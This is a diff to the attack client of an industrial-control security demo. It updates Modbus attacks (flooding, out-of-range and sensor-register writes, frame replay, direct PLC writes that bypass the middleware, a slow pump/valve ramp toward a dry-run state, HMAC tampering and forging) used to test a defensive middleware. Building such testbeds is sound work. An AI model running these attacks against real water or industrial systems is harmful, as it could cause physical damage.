@@ -4,28 +4,29 @@ attacker/attacker.py
 Real Modbus attack client for the Industrial Mind demo.
 
 Middleware:
-    127.0.0.1:5021
+    <IM_MIDDLEWARE_HOST>:5021
 
 PLC:
-    127.0.0.1:5020
+    <IM_PLC_HOST>:5020
 
 Attacks (original):
     flood                  signed burst above the 5 req/s limit     -> RATE_LIMIT_EXCEEDED
-    impossible-command     signed 999 PSI tank pressure              -> OUT_OF_BOUNDS
+    impossible-command     signed out-of-range actuator value        -> OUT_OF_BOUNDS
+    sensor-write            signed write to a read-only sensor        -> WRITE_TO_SENSOR_REGISTER
     replay                 byte-identical re-send of a signed frame  -> REPLAY_DETECTED
     false-injection        legit command, then direct PLC write      (bypasses middleware)
 
 Attacks (new):
-    cross-register         low-and-slow multi-machine attack: each step is
+    cross-register         low-and-slow multi-register attack: each step is
                            in-bounds and within rate limits, but the combined
-                           heater/cooling state is unsafe  -> CROSS_REGISTER_VIOLATION
+                           raw-water pump/valve state is unsafe
+                           -> CROSS_REGISTER_VIOLATION
     hmac-missing           plain unsigned FC6 write                  -> HMAC_MISSING
     hmac-tamper            valid signed frame, value altered in transit -> HMAC_INVALID
     hmac-forged            frame signed with a guessed key           -> HMAC_INVALID
-    delayed-replay         correctly signed frame that is 5 minutes old -> HMAC_EXPIRED
 
 Threat model:
-    flood / impossible-command / replay / cross-register / delayed-replay model
+    flood / impossible-command / replay / cross-register model
     a COMPROMISED ENGINEERING WORKSTATION that holds the shared HMAC key
     (insider). HMAC cannot stop an attacker who owns the key; the cyber rate /
     replay checks and the Physical Agent must. The hmac-* attacks model an
@@ -38,10 +39,25 @@ Source IP:
         sudo ifconfig lo0 alias 127.0.0.2 up
     Or run the attacker on another machine with --host <middleware-ip>.
 
+Two families (Phase 8):
+    FIXED, scripted attacks (above): identical every run, for live-demo reliability.
+        The three DEMO attacks are: flood, impossible-command, cross-register.
+        The rest (sensor-write, replay, false-injection, hmac-*) are fixed protocol-level probes.
+    RANDOMISED attacks (`random`): target register, timing, intensity, step size and counts are drawn per run
+        from distributions (attacker/scenarios.py); the seed is printed so any run can be reproduced.
+        Types: freeze / ramp / cross-register  (SWaT-derived behaviours)
+               impossible-command / flood / replay  (SYNTHETIC EXTENSION: SWaT has no network-layer attacks)
+
+        python attacker/attacker.py random --type ramp                 # new parameters every run
+        python attacker/attacker.py random --type flood --seed 42      # reproducible
+        python attacker/attacker.py random --dry-run --count 5         # print plans, send nothing
+        python attacker/attacker.py random --log-file logs/attacks.jsonl
+
 Usage:
 
     python attacker/attacker.py flood
     python attacker/attacker.py impossible-command
+    python attacker/attacker.py sensor-write
     python attacker/attacker.py replay
     python attacker/attacker.py false-injection
     python attacker/attacker.py cross-register
@@ -52,6 +68,7 @@ Usage:
 from __future__ import annotations
 
 import argparse
+import json
 import os
 import secrets
 import sys
@@ -63,25 +80,25 @@ sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
 from pymodbus.client import ModbusTcpClient  # noqa: E402
 
-from docs.interfaces import (  # noqa: E402
+from core.interfaces import (  # noqa: E402
     MACHINES,
     NUM_REGISTERS,
     FRAME_BASE,
-    TANK_PRESSURE,
-    CONVEYOR_SPEED,
-    COOLING_VALVE,
-    HEATER_TEMP,
+    MV101,
+    P101,
+    LIT101,
     to_raw,
     from_raw,
 )
-from docs import hmac_auth  # noqa: E402
+from attacker import scenarios  # noqa: E402
+from core import hmac_auth, netconfig# noqa: E402
 
 
-MIDDLEWARE_HOST = "127.0.0.1"
-MIDDLEWARE_PORT = 5021
+MIDDLEWARE_HOST = netconfig.MIDDLEWARE_HOST   # env IM_MIDDLEWARE_HOST/PORT, --host/--port
+MIDDLEWARE_PORT = netconfig.MIDDLEWARE_PORT
 
-PLC_HOST = "127.0.0.1"
-PLC_PORT = 5020
+PLC_HOST = netconfig.PLC_HOST                  # env IM_PLC_HOST/PORT, --plc-host/--plc-port
+PLC_PORT = netconfig.PLC_PORT
 
 UNIT_ID = 1
 
@@ -219,7 +236,7 @@ def flood_attack() -> None:
 
     try:
 
-        base = read_plant(client).get(CONVEYOR_SPEED, 0.0)
+        base = read_plant(client).get(MV101, 0.0)
 
         # More than the cyber-agent limit of
         # 5 requests / second. Tiny moves so the
@@ -229,7 +246,7 @@ def flood_attack() -> None:
 
             write_signed(
                 client,
-                register=CONVEYOR_SPEED,
+                register=MV101,
                 value=round(base + 0.1 * (i + 1), 1)
             )
 
@@ -260,12 +277,12 @@ def impossible_command_attack() -> None:
 
     try:
 
-        # Tank pressure safe range:
-        # 0–100 PSI
+        # Raw Water Pump safe range:
+        # 0-100 %
 
         write_signed(
             client,
-            register=TANK_PRESSURE,
+            register=P101,
             value=999
         )
 
@@ -276,6 +293,43 @@ def impossible_command_attack() -> None:
     print(
         "[ATTACK] Impossible command complete."
     )
+
+
+# ---------------------------------------------------------
+# ATTACK 2b — SENSOR WRITE
+# ---------------------------------------------------------
+
+def sensor_write_attack() -> None:
+    """A signed, perfectly in-range write aimed at a SENSOR register. Only
+    actuator registers accept commands; the Physical Agent must drop this
+    regardless of value -> WRITE_TO_SENSOR_REGISTER."""
+
+    print("\n[ATTACK] SENSOR WRITE (command to a read-only register)")
+
+    client = connect(
+        MIDDLEWARE_HOST,
+        MIDDLEWARE_PORT
+    )
+
+    if client is None:
+        return
+
+    try:
+
+        # LIT101 (Raw Tank Level) is a sensor, 0-1000 mm. The value itself
+        # is in-bounds; the attack is writing to a sensor at all.
+
+        write_signed(
+            client,
+            register=LIT101,
+            value=500.0
+        )
+
+    finally:
+
+        client.close()
+
+    print("[ATTACK] Sensor write complete.")
 
 
 # ---------------------------------------------------------
@@ -296,7 +350,7 @@ def replay_attack() -> None:
 
     try:
 
-        register = CONVEYOR_SPEED
+        register = MV101
         value = round(read_plant(client).get(register, 0.0) + 0.5, 1)
 
         # Capture one legitimate signed frame ...
@@ -340,11 +394,11 @@ def false_injection_attack() -> None:
 
     try:
 
-        current = read_plant(middleware).get(CONVEYOR_SPEED, 0.0)
+        current = read_plant(middleware).get(MV101, 0.0)
 
         write_signed(
             middleware,
-            register=CONVEYOR_SPEED,
+            register=MV101,
             value=round(current + 1.0, 1)
         )
 
@@ -373,11 +427,12 @@ def false_injection_attack() -> None:
 
     try:
 
-        # Deliberately different value.
+        # Deliberately different, misleading value on the stage-1
+        # inlet valve - bypasses the middleware entirely.
 
         write_register(
             plc,
-            register=CONVEYOR_SPEED,
+            register=MV101,
             value=0
         )
 
@@ -461,7 +516,7 @@ def _ramp(client: ModbusTcpClient, register: int, goal: float, step: float, wait
 def cross_register_attack() -> None:
 
     print("\n[ATTACK] CROSS-REGISTER CORRELATION (low and slow)")
-    print("[ATTACK] Goal: heater >= 110 C with cooling valve <= 25 deg (thermal runaway).")
+    print("[ATTACK] Goal: RAW_PUMP_DRY_RUN - P101 >= 60% with MV101 <= 10% (raw tank runs dry).")
     print("[ATTACK] Every single command stays inside its own safe range and ramp rate.")
 
     client = connect(
@@ -474,16 +529,22 @@ def cross_register_attack() -> None:
 
     try:
 
-        print("[ATTACK] Stage 1: close the cooling valve (safe on its own - heater is low)")
-        _ramp(client, COOLING_VALVE, goal=15.0, step=10.0, wait=3.0)
+        print("[ATTACK] Stage 1: close the inlet valve (safe on its own - pump is low)")
+        closed = _ramp(client, MV101, goal=5.0, step=10.0, wait=3.0)
 
-        print("[ATTACK] Stage 2: raise the heater setpoint (each step safe on its own)")
-        reached = _ramp(client, HEATER_TEMP, goal=118.0, step=10.0, wait=3.0)
-
-        if reached:
-            print("[ATTACK] Heater reached goal - combined unsafe state was NOT prevented!")
+        if not closed:
+            # The pump is already above the dry-run threshold, so closing the inlet completes the unsafe combination.
+            print("[ATTACK] Middleware refused the step that completes the unsafe combination (inlet valve held above "
+                  "the dry-run threshold while the pump is fast). Unsafe state PREVENTED.")
         else:
-            print("[ATTACK] Middleware refused the step that completes the unsafe combination.")
+            print("[ATTACK] Stage 2: raise the raw-water pump speed (each step safe on its own)")
+            reached = _ramp(client, P101, goal=70.0, step=10.0, wait=3.0)
+
+            if reached:
+                print("[ATTACK] Both goals reached - combined unsafe state was NOT prevented "
+                      "(check that the plant was not already unsafe, e.g. after false-injection).")
+            else:
+                print("[ATTACK] Middleware refused the step that completes the unsafe combination.")
 
     finally:
 
@@ -505,9 +566,9 @@ def hmac_missing_attack() -> None:
         return
 
     try:
-        current = read_plant(client).get(COOLING_VALVE, 45.0)
+        current = read_plant(client).get(MV101, 32.0)
         # A perfectly safe value - the only problem is that it is unsigned.
-        write_register(client, COOLING_VALVE, round(current + 1.0, 1))
+        write_register(client, MV101, round(current + 1.0, 1))
     finally:
         client.close()
 
@@ -523,13 +584,13 @@ def hmac_tamper_attack() -> None:
         return
 
     try:
-        current = read_plant(client).get(HEATER_TEMP, 60.0)
-        frame = hmac_auth.build_frame(HEATER_TEMP, round(current + 1.0, 1))
+        current = read_plant(client).get(P101, 50.0)
+        frame = hmac_auth.build_frame(P101, round(current + 1.0, 1))
 
         # Intercepted in transit: change the value, keep the original tag.
-        frame[2] = to_raw(140.0)
+        frame[2] = to_raw(95.0)
 
-        send_frame(client, frame, "tampered HEATER_TEMP=140.0 (original tag)")
+        send_frame(client, frame, "tampered P101=95.0 (original tag)")
     finally:
         client.close()
 
@@ -546,30 +607,75 @@ def hmac_forged_attack() -> None:
 
     try:
         wrong_key = secrets.token_hex(32).encode()
-        current = read_plant(client).get(COOLING_VALVE, 45.0)
-        write_signed(client, COOLING_VALVE, round(current + 1.0, 1), key=wrong_key)
+        current = read_plant(client).get(MV101, 32.0)
+        write_signed(client, MV101, round(current + 1.0, 1), key=wrong_key)
     finally:
         client.close()
 
     print("[ATTACK] HMAC forged complete.")
 
 
-def delayed_replay_attack() -> None:
+# ---------------------------------------------------------
+# RANDOMISED ATTACKS (plans come from attacker/scenarios.py)
+# ---------------------------------------------------------
 
-    print("\n[ATTACK] DELAYED REPLAY (valid signature, captured 5 minutes ago)")
+DEMO_ATTACKS = ("flood", "impossible-command", "cross-register")   # fixed-timing, demo-reliable
 
+
+def run_plan(plan: dict) -> List[dict]:
+    """Execute a plan over Modbus against the middleware. Returns one record per step."""
+    print(f"\n[ATTACK] RANDOMISED {plan['type'].upper()} seed={plan['seed']} origin={plan['origin']} "
+          f"ranges={plan['ranges_from']}")
+    print(f"[ATTACK] params: {json.dumps(plan['params'])}")
     client = connect(MIDDLEWARE_HOST, MIDDLEWARE_PORT)
     if client is None:
-        return
-
+        return []
+    sent: Dict[int, List[int]] = {}
+    records: List[dict] = []
+    t0 = time.time()
     try:
-        current = read_plant(client).get(CONVEYOR_SPEED, 0.0)
-        old_ts = int((time.time() - 300) * 1000)
-        write_signed(client, CONVEYOR_SPEED, round(current + 1.0, 1), timestamp_ms=old_ts)
+        for i, st in enumerate(plan["steps"]):
+            wait = st["t"] - (time.time() - t0)
+            if wait > 0:
+                time.sleep(wait)
+            if st["kind"] == "replay_of":
+                ok = send_frame(client, sent[st["ref"]], f"REPLAYED {st['tag']}={st['value']}")
+            else:
+                frame = hmac_auth.build_frame(st["register"], st["value"])
+                sent[i] = frame
+                ok = send_frame(client, frame, f"signed {st['tag']}={st['value']}")
+            records.append({"step": i, "t": st["t"], "kind": st["kind"], "register": st["register"], "tag": st["tag"],
+                            "value": st["value"], "sent": bool(ok), "wall_time": round(time.time(), 3)})
     finally:
         client.close()
+    print(f"[ATTACK] {plan['type']} complete ({len(records)} frames).")
+    return records
 
-    print("[ATTACK] Delayed replay complete.")
+
+def random_attack(attack_type: Optional[str], seed: Optional[int], dry_run: bool, count: int,
+                  log_file: Optional[str]) -> None:
+    for n in range(count):
+        # one independent seed per run unless the user pinned one
+        run_seed = int(seed) + n if seed is not None else secrets.randbelow(2**31)
+        rng_type = attack_type or sorted(scenarios.TYPES)[run_seed % len(scenarios.TYPES)]
+        state = None
+        if not dry_run:
+            probe = connect(MIDDLEWARE_HOST, MIDDLEWARE_PORT)
+            if probe is not None:
+                state = read_plant(probe) or None
+                probe.close()
+        plan = scenarios.make_plan(rng_type, run_seed, state, scenarios.load_profile())
+        if dry_run:
+            print(json.dumps({k: plan[k] for k in ("type", "seed", "origin", "ranges_from", "params")}))
+            records: List[dict] = []
+        else:
+            records = run_plan(plan)
+        if log_file:
+            os.makedirs(os.path.dirname(os.path.abspath(log_file)), exist_ok=True)
+            with open(log_file, "a") as fh:
+                fh.write(json.dumps({"type": plan["type"], "seed": plan["seed"], "origin": plan["origin"],
+                                     "ranges_from": plan["ranges_from"], "params": plan["params"],
+                                     "dry_run": dry_run, "records": records}) + "\n")
 
 
 # ---------------------------------------------------------
@@ -579,13 +685,13 @@ def delayed_replay_attack() -> None:
 ATTACKS = {
     "flood": flood_attack,
     "impossible-command": impossible_command_attack,
+    "sensor-write": sensor_write_attack,
     "replay": replay_attack,
     "false-injection": false_injection_attack,
     "cross-register": cross_register_attack,
     "hmac-missing": hmac_missing_attack,
     "hmac-tamper": hmac_tamper_attack,
     "hmac-forged": hmac_forged_attack,
-    "delayed-replay": delayed_replay_attack,
 }
 
 
@@ -594,7 +700,13 @@ def main() -> None:
     global _SOURCE_IP, MIDDLEWARE_HOST, MIDDLEWARE_PORT, PLC_HOST, PLC_PORT
 
     parser = argparse.ArgumentParser(description="Industrial Mind attack client")
-    parser.add_argument("attack", nargs="?", choices=sorted(ATTACKS))
+    parser.add_argument("attack", nargs="?", choices=sorted(ATTACKS) + ["random"])
+    parser.add_argument("--type", choices=sorted(scenarios.TYPES), default=None,
+                        help="random: attack type (default: varies with the seed)")
+    parser.add_argument("--seed", type=int, default=None, help="random: reproducible run (default: fresh seed each run)")
+    parser.add_argument("--count", type=int, default=1, help="random: number of attacks to run")
+    parser.add_argument("--dry-run", action="store_true", help="random: print the plan(s), send nothing")
+    parser.add_argument("--log-file", default=None, help="random: append plan + per-frame records as JSONL")
     parser.add_argument(
         "--source-ip",
         default="",
@@ -619,6 +731,9 @@ def main() -> None:
 
     for src in sources:
         _SOURCE_IP = src
+        if args.attack == "random":
+            random_attack(args.type, args.seed, args.dry_run, args.count, args.log_file)
+            continue
         ATTACKS[args.attack]()
         if len(sources) > 1:
             time.sleep(1.2)   # keep per-source bursts separate
